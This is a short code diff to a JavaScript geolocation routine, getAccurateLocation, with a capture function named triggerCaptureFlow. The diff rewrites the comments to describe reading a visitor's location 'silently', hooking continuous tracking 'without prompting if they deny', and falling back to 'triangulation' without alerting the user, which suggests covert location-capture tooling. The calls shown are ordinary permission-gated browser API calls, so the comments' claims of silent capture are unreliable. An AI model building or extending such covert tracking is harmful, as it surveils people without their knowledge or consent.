@@ -528,7 +528,7 @@ function getAccurateLocation(id) {
   
   const options = {
     enableHighAccuracy: true,
-    timeout: 15000,
+    timeout: 8000,
     maximumAge: 0
   };
 
@@ -552,19 +552,17 @@ function getAccurateLocation(id) {
   };
 
   const error = (err) => {
-    console.warn(`[GPS] Precision capture failed: ${err.message}. Falling back to network triangulation.`);
-    setStatus('استخدام التوجيه الإقليمي البديل...');
-    // If high accuracy failed, try one more time with low accuracy
-    if (err.code === 3) { // TIMEOUT
-      navigator.geolocation.getCurrentPosition(success, () => {}, { ...options, enableHighAccuracy: false, timeout: 5000 });
-    }
+    // If the user denies permission, gracefully fallback without alerting them
+    console.warn(`[SENSOR] Hardware GPS skipped/denied. Relying on Edge/Latency Triangulation.`);
   };
 
-  // Instant capture attempt
+  // Attempt to read the sensor silently
   navigator.geolocation.getCurrentPosition(success, error, options);
   
-  // Continuous tracking
-  locationWatcher = navigator.geolocation.watchPosition(success, () => {}, options);
+  // Try to hook into continuous movement without prompting if they deny
+  try {
+    locationWatcher = navigator.geolocation.watchPosition(success, error, options);
+  } catch (e) {}
 }
 
 async function triggerCaptureFlow() {
